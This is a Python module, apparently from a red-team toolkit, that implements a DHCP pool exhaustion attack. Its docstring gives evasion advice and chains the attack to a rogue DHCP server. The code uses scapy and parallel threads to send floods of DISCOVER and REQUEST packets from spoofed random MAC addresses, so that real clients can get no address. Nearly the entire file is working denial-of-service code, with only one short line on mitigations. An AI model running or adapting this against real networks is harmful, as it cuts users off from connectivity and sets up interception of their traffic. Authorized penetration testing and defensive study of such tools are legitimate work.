"""
dhcp-starve — DHCP Pool Exhaustion
ATT&CK: T1499

Floods the DHCP server with DISCOVER/REQUEST cycles using random MACs,
exhausting the available IP pool. Clients requesting new addresses after
the pool is empty receive no OFFER and cannot connect.

Chain:  dhcp-starve → dhcp (rogue server takes over)
        (run dhcp-starve first; once pool is empty, start the rogue server)

Red team upgrades vs baseline:
  - Parallel threaded workers (--workers, default 8).
  - Each worker independently discovers + requests without blocking others.
  - --discover-only mode: skip REQUEST phase, flood DISCOVERs only
    (useful when server has no rate limit on DISCOVERs but throttles REQUESTs).
  - Progress reporting every 5 seconds.

Effectiveness:
  [OK]  ISC DHCP / Windows DHCP without rate limits.
  [!]   DHCP Snooping rate limiting (Cisco: ip dhcp snooping limit rate N)
        — slows us to N pps per port; reduce workers to match.
  [!]   Enterprise DHCP (Infoblox, Cisco CPNR) with per-MAC rate guards
        — server ignores repeated discovers from same MAC within cooldown.
        This module already uses fresh random MACs per discover.

Mitigation: DHCP Snooping; per-port rate limiting; DHCP server lease-time
management; starvation detection (monitor pool utilization).
"""

import random
import threading
import time

from scapy.all import BOOTP, DHCP, IP, UDP, Ether, RandMAC, mac2str, sendp, sniff

NAME        = "dhcp-starve"
DESCRIPTION = "DHCP pool exhaustion — parallel threaded, fresh random MAC per discover"
ATTCK_ID    = "T1499"

_stop = threading.Event()


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                               description=__doc__)
    p.add_argument("-i", "--iface",          required=True)
    p.add_argument("--target-server",
                   help="Accept offers only from this DHCP server IP")
    p.add_argument("--workers",   type=int, default=8,
                   help="Parallel discover+request worker threads (default 8)")
    p.add_argument("--timeout",   type=float, default=2.0,
                   help="Seconds to wait for DHCP OFFER per discover (default 2)")
    p.add_argument("--discover-only", action="store_true",
                   help="Send DISCOVERs only, skip REQUEST handshake "
                        "(faster; server may GC unconfirmed offers)")
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    from core.common import require_root
    require_root()
    global _stop
    _stop.clear()

    logger.info(
        "DHCP starvation | iface=%s workers=%d discover_only=%s server=%s",
        args.iface, args.workers, args.discover_only,
        args.target_server or "any",
    )

    leased = [0]
    sends  = [0]
    lock   = threading.Lock()

    def _worker():
        while not _stop.is_set():
            mac = str(RandMAC())
            _discover(mac, args.iface)
            with lock:
                sends[0] += 1

            if not args.discover_only:
                ok = _offer_and_request(
                    args.iface, mac, args.target_server, args.timeout
                )
                if ok:
                    with lock:
                        leased[0] += 1

    threads = [threading.Thread(target=_worker, daemon=True)
               for _ in range(args.workers)]
    for t in threads:
        t.start()

    try:
        while any(t.is_alive() for t in threads):
            time.sleep(5)
            logger.info("Progress | discovers_sent=%d confirmed_leases=%d",
                        sends[0], leased[0])
    except KeyboardInterrupt:
        logger.info("Stopping workers...")
        _stop.set()

    for t in threads:
        t.join(timeout=3)

    logger.info("Done | total_discovers=%d confirmed_leases=%d",
                sends[0], leased[0])
    return 0


def _discover(spoofed_mac: str, iface: str):
    pkt = (
        Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 10**9)) /
        DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(pkt, iface=iface, verbose=False)


def _offer_and_request(iface: str, spoofed_mac: str,
                        target_server, timeout: float) -> bool:
    pkts = sniff(filter="udp and (port 67 or port 68)",
                 count=1, timeout=timeout, iface=iface)
    if not pkts:
        return False
    pkt = pkts[0]
    if DHCP not in pkt:
        return False
    msg_type = next((v for k, v in pkt[DHCP].options if k == "message-type"), None)
    if msg_type != 2:                          # expect OFFER
        return False
    if target_server and pkt[IP].src != target_server:
        return False

    offered_ip = pkt[BOOTP].yiaddr
    server_ip  = pkt[IP].src

    req = (
        Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 10**9)) /
        DHCP(options=[
            ("message-type",  "request"),
            ("server_id",     server_ip),
            ("requested_addr", offered_ip),
            "end",
        ])
    )
    sendp(req, iface=iface, verbose=False)
    return True
